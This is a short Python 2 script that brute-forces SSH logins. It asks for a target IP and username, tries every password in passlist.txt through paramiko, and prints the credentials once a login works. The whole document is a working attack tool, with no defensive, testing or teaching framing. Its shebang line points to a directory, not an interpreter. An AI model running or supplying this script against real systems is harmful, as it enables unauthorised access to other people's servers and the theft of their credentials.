#!/usr/local/bin
import paramiko, sys, os, socket
global host, username, line, input_file

line = "\n-------------------------------------\n"

try:
    host = raw_input("Enter Target IP: ")
    username = raw_input("Enter SSH username: ")
    input_file = 'passlist.txt'
except:
    print "\n\n[*] User requested an Interrupt"
    sys.exit(3)

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error, e:
        code = 2

    ssh.close()
    return code

input_file = open(input_file)
print ""

for i in input_file.readlines():
    password = i.rstrip("\n")
    try:
        response = ssh_connect(password)

        if response == 0:
            print("Username & Password found :%s%s" %(username, password))
            sys.exit(0)
        elif response == 1:
            print ("Login incorrect")
        elif response == 2:
            print ("Connection not established")
    except Exception, e:
        print e
        pass
input_file.close()


